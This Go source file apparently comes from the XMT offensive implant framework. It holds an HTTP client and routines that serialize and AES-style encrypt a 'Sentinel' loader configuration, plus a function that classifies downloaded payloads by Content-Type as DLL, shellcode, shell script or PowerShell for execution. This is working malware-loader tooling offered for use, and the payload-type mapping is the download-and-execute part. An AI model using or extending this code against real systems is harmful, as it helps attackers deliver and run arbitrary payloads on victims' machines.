package man

import (
	"crypto/cipher"
	"crypto/rand"
	"io"
	"net"
	"net/http"
	"net/http/cookiejar"
	"os"
	"strings"

	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
)

var (
	// NOTE(dij): This is fucking annoying.. why? The error is ALWAYS nil!
	jar, _ = cookiejar.New(nil)

	client = &http.Client{
		Jar:     jar,
		Timeout: timeoutWeb,
		Transport: &http.Transport{
			Proxy:                 device.Proxy,
			DialContext:           (&net.Dialer{Timeout: timeoutWeb, KeepAlive: timeoutWeb, DualStack: true}).DialContext,
			MaxIdleConns:          64,
			IdleConnTimeout:       timeoutWeb * 4,
			ForceAttemptHTTP2:     true,
			TLSHandshakeTimeout:   timeoutWeb,
			ExpectContinueTimeout: timeoutWeb,
			ResponseHeaderTimeout: timeoutWeb,
		},
	}
)

// File will attempt to Marshal the Sentinel struct into the supplied file path.
// Any errors that occur during reading will be returned.
//
// This function will truncate and overrite any file that exists at 'p'.
func (s Sentinel) File(p string) error {
	// 0x242 - CREATE | TRUNCATE | RDWR
	f, err := os.OpenFile(p, 0x242, 0644)
	if err != nil {
		return err
	}
	err = s.Write(f)
	f.Close()
	return err
}

// Write will Marshal and write the Sentinel data to the supplied Writer.
// Any errors that occur during writing will be returned.
func (s Sentinel) Write(w io.Writer) error {
	var (
		v      = s.text()
		_, err = w.Write([]byte{byte(len(v) >> 8), byte(len(v))})
	)
	if err != nil {
		return err
	}
	for i := range v {
		if _, err := w.Write(v[i]); err != nil {
			return err
		}
		if _, err := w.Write([]byte{0x1E}); err != nil {
			return err
		}
	}
	return nil
}

// Reader will attempt to Marshal the Sentinel struct from the 'io.Reader'
//
// This function will also attempt to fill in the Filter and Linker parameters.
//
// Any errors that occur during reading will be returned.
func Reader(r io.Reader) (*Sentinel, error) {
	var (
		b      [64]byte
		n, err = r.Read(b[0:2])
	)
	if n = int(uint16(b[1]) | uint16(b[0])<<8); err != nil || n <= 0 {
		return nil, err
	}
	d := make([]string, n)
	for v, c, x := 0, 0, make([]byte, 0, 512); ; {
		if n, err = r.Read(b[:]); n == 0 && err != nil {
			break
		}
		for i := 0; i < n; i++ {
			if b[i] == 0x1E {
				d[c] = string(x[:v])
				v, x = 0, x[:]
				c++
				continue
			}
			x = append(x, b[i])
			v++
		}
	}
	switch {
	case err != io.EOF:
		return nil, err
	case len(d) == 0:
		return new(Sentinel), nil
	}
	var s Sentinel
	if len(d[0]) > 1 && d[0][0] == '{' && d[0][len(d[0])-1] == '}' {
		if err := s.Filter.UnmarshalJSON([]byte(d[0])); err != nil {
			return nil, err
		}
		d = d[1:]
	}
	if len(d) > 0 && len(d[0]) > 1 && d[0][0] == '*' {
		s.Linker = d[0][1:]
		d = d[1:]
	}
	s.Paths = d
	return &s, nil
}

// ParseDownloadHeader converts HTTP headers into index-based output types.
//
// Resulting output types:
//   - 0: None found.
//   - 1: DLL.
//   - 2: Assembly Code (ASM).
//   - 3: Shell Script.
//   - 4: PowerShell Script.
//
// Ignores '*/' prefix.
//
// Examples
//  DLL:
//     '/d'
//     '/dll'
//     '/dontcare'
//     '/dynamic'
//     '/dynamiclinklib'
//
//  Assembly Code:
//     '/a'
//     '/b'
//     '/asm'
//     '/bin'
//     '/assembly'
//     '/binary'
//     '/code'
//     '/shellcode'
//     '/superscript'
//     '/shutupbro'
//
//  Shell Script:
//     '/x'
//     '/s'
//     '/cm'
//     '/cmd'
//     '/xgongiveittoya'
//     '/xecute'
//     '/xe'
//     '/com'
//     '/command'
//     '/shell'
//     '/sh'
//     '/script'
//
//  PowerShell:
//     '/p'
//     '/pwsh'
//     '/powershell'
//     '/power'
//     '/powerwash'
//     '/powerwashing'
//     '/powerwashingsimulator'
//     '/pwn'
//     '/pwnme'
//
func ParseDownloadHeader(h http.Header) uint8 {
	if len(h) == 0 {
		return 0
	}
	var c string
	for k, v := range h {
		if len(k) < 12 {
			continue
		}
		if k[0] != 'C' && k[0] != 'c' && k[8] != '-' && k[9] != 'T' && k[9] != 't' {
			continue
		}
		if len(v) == 0 || len(v[0]) == 0 {
			continue
		}
		c = v[0]
		break
	}
	if len(c) == 0 {
		return 0
	}
	x := strings.IndexByte(c, '/')
	if x < 1 || x >= len(c) {
		return 0
	}
	x++
	switch n := len(c) - x; {
	case c[x] == 'd': // Covers all '/d*' for DLL.
		return 1
	case c[x] == 'p': // Covers all '/p*' for PowerShell.
		return 4
	case c[x] == 'x': // Covers all '/x*' for Shell Execute.
		return 3
	case c[x] == 'a' || c[x] == 'b': // Covers '/a*' and '/b*' for ASM.
		return 2
	case n > 1 && c[x] == 'c' && c[x+1] == 'm': // Covers '/cm*' for Script.
		fallthrough
	case n > 2 && c[x] == 'c' && c[x+1] == 'o' && c[x+2] == 'm': // Covers '/com*' for Script.
		return 3
	case c[x] == 'c': // Covers '/c*' for ASM.
		fallthrough
	case n > 6 && c[x] == 's' && c[x+1] != 'c': // Covers '/shellcode' for ASM.
		return 2
	case c[x] == 's': // Covers '/s*' for Script.
		return 3
	}
	return 0
}

// Crypt will attempt to Marshal the Sentinel struct from the supplied file path
// and 'cipher.Block'.
//
// If the Block is nil, this function will behave similar to 'File(p)'.
//
// This function will also attempt to fill in the Filter and Linker parameters.
//
// Any errors that occur during reading will be returned.
func Crypt(c cipher.Block, p string) (*Sentinel, error) {
	// 0 - READONLY
	f, err := os.OpenFile(p, 0, 0)
	if err != nil {
		return nil, err
	}
	s, err := CryptReader(c, f)
	if f.Close(); err != nil {
		return nil, err
	}
	return s, nil
}

// Crypt will Marshal and write the Sentinel data to the supplied Writer and
// will encrypt it using the supplied 'cipher.Block' with a randomized IV value.
//
// If the Block is nil, this function is the same as 's.Write(w)'.
//
// Any errors that occur during writing will be returned.
func (s Sentinel) Crypt(c cipher.Block, w io.Writer) error {
	if c == nil {
		return s.Write(w)
	}
	var (
		b      = make([]byte, c.BlockSize())
		_, err = rand.Read(b)
	)
	if err != nil {
		return err
	}
	n, err := w.Write(b)
	if err != nil {
		return err
	}
	if n != c.BlockSize() {
		return io.ErrShortWrite
	}
	o, err := crypto.Encrypter(c, b, w)
	if err != nil {
		return err
	}
	err = s.Write(o)
	o.Close()
	return err
}

// CryptFile will attempt to Marshal the Sentinel struct into the supplied file
// path and 'cipher.Block'.
//
// If the Block is nil, this function will behave similar to 's.File(p)'.
//
// This function will also attempt to fill in the Filter and Linker parameters.
//
// Any errors that occur during reading will be returned.
//
// This function will truncate and overrite any file that exists at 'p'.
func (s Sentinel) CryptFile(c cipher.Block, p string) error {
	if c == nil {
		return s.File(p)
	}
	// 0x242 - CREATE | TRUNCATE | RDWR
	f, err := os.OpenFile(p, 0x242, 0644)
	if err != nil {
		return err
	}
	err = s.Crypt(c, f)
	f.Close()
	return err
}

// CryptReader will attempt to Marshal the Sentinel struct from the 'io.Reader'
// and the supplied 'cipher.Block'.
//
// If the Block is nil, this function will behave similar to 'Reader(p)'.
//
// This function will also attempt to fill in the Filter and Linker parameters.
//
// Any errors that occur during reading will be returned.
func CryptReader(c cipher.Block, r io.Reader) (*Sentinel, error) {
	if c == nil {
		return Reader(r)
	}
	var (
		b      = make([]byte, c.BlockSize())
		_, err = r.Read(b)
	)
	if err != nil {
		return nil, err
	}
	i, err := crypto.Decrypter(c, b, r)
	if err != nil {
		return nil, err
	}
	s, err := Reader(i)
	i.Close()
	return s, err
}
